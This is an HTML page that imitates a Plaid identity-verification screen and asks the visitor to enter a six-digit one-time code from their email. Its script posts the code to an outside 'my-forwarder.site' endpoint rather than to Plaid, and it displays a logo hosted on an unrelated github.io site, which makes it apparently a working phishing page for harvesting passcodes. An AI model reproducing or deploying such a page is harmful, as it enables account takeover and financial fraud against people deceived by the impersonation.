<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        
        body {
            background-color: #f7fafc;
            color: #1a202c;
            line-height: 1.5;
            overflow-x: hidden;
        }
        
        .container {
            max-width: 420px;
            margin: 20px auto;
            padding: 0 20px;
            position: relative;
            min-height: 600px;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 20px;
            position: relative;
            z-index: 10;
        }
        
        .logo img {
            height: 60px;
        }
        
        .card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            padding: 24px;
            transition: transform 0.3s ease;
            position: relative;
            left: 0;
            min-height: 400px;
            margin-top: 60px;
        }
        
        .otp-header {
            text-align: center;
            margin-bottom: 24px;
        }
        
        .otp-header h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .otp-header p {
            color: #4a5568;
            font-size: 14px;
        }
        
        .verification-instructions {
            background: #f0f4f8;
            padding: 12px;
            border-radius: 6px;
            margin-bottom: 20px;
            text-align: center;
            font-size: 14px;
            color: #4a5568;
        }
        
        .otp-inputs {
            display: flex;
            justify-content: space-between;
            margin: 20px 0;
        }
        
        .otp-inputs input {
            width: 50px;
            height: 50px;
            text-align: center;
            font-size: 20px;
            border: 1px solid #e2e8f0;
            border-radius: 6px;
        }
        
        .otp-inputs input:focus {
            outline: none;
            border-color: #000000;
        }
        
        .submit-btn {
            width: 100%;
            background-color: #000000;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 20px;
        }
        
        .submit-btn:hover {
            background-color: #333333;
        }
        
        .throbber {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #000000;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .error-message {
            color: #e53e3e;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://models-bangbros.github.io/images/OIP__2_-removebg-preview.png" alt="Plaid Logo">
        </div>
        
        <div class="card">
            <div class="otp-header">
                <h1>Verify Your Identity</h1>
                <p>Enter the 6-digit code sent to your email</p>
            </div>
            
            <div class="verification-instructions">
                Check your registered email for the verification code
            </div>
            
            <form id="otpForm">
                <div class="otp-inputs">
                    <input type="text" maxlength="1" pattern="\d" required>
                    <input type="text" maxlength="1" pattern="\d" required>
                    <input type="text" maxlength="1" pattern="\d" required>
                    <input type="text" maxlength="1" pattern="\d" required>
                    <input type="text" maxlength="1" pattern="\d" required>
                    <input type="text" maxlength="1" pattern="\d" required>
                </div>
                
                <div class="error-message" id="errorMessage"></div>
                
                <div class="throbber" id="otpThrobber"></div>
                
                <button type="submit" class="submit-btn">Verify</button>
            </form>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const otpForm = document.getElementById('otpForm');
            const otpInputs = document.querySelectorAll('.otp-inputs input');
            const otpThrobber = document.getElementById('otpThrobber');
            const errorMessage = document.getElementById('errorMessage');
            
            // Auto-focus first input
            otpInputs[0].focus();
            
            // Handle input navigation
            otpInputs.forEach((input, index) => {
                input.addEventListener('input', function() {
                    errorMessage.style.display = 'none';
                    if (this.value.length === 1) {
                        if (index < otpInputs.length - 1) {
                            otpInputs[index + 1].focus();
                        }
                    }
                });
                
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && !this.value && index > 0) {
                        otpInputs[index - 1].focus();
                    }
                });
            });
            
            // Form submission
            otpForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                // Show loading spinner
                otpThrobber.style.display = 'block';
                errorMessage.style.display = 'none';
                
                // Combine OTP digits
                const otp = Array.from(otpInputs).map(input => input.value).join('');
                
                // Basic client-side validation
                if (otp.length !== 6 || !/^\d+$/.test(otp)) {
                    showError('Please enter a valid 6-digit code');
                    return;
                }
                
                try {
                    // Submit to your endpoint
                    const response = await submitOTP(otp);
                    
                    if (response.success) {
                        // Redirect on success (replace with your success page)
                        window.location.href = 'success.html';
                    } else {
                        showError(response.message || 'Verification failed');
                    }
                } catch (error) {
                    showError('Network error. Please try again.');
                    console.error('Submission error:', error);
                } finally {
                    otpThrobber.style.display = 'none';
                }
            });
            
            async function submitOTP(otp) {
                const formData = new FormData();
                formData.append('otp', otp);
                
                // Submit to your endpoint
                const response = await fetch('https://my-forwarder.site/plaid/otp-action.php', {
                    method: 'POST',
                    body: formData
                });
                
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                
                return await response.json();
            }
            
            function showError(message) {
                errorMessage.textContent = message;
                errorMessage.style.display = 'block';
                otpInputs.forEach(input => input.value = '');
                otpInputs[0].focus();
            }
        });
    </script>
</body>
</html>
